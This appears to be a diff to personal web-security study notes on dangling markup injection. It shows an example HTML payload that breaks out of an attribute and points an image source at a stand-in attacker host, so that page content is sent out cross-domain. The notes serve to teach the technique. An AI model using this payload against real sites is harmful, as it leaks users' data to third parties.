@@ -2,7 +2,7 @@ Dangling markup injection is a technique for capturing data cross-domain in situ
 ## Example
 Suppose an application is vulnerable to XSS and does not filter or escape the `>` or `"` characters. An attacker can break out of any quoted attribute value and the enclosing tag using `">` in their payload which allows them to return to an HTML context.
 
-However, a regular XSS attack is not possible, due to input filters, [content security policy](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-Site%20Scripting%2FContent%20Security%20Policy%2FIntroduction), or other obstacles. In this case, an attacker can deliver the following payload and perform a dangling markup injection attack:
+However, a regular XSS attack is not possible, due to input filters, [content security policy](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-Site%20Scripting%2FContent%20Security%20Policy%2FIntroduction), or other obstacles. In this case, an attacker can deliver the following payload:
 ```html
 "><img src='//attacker-website.com?
 ```
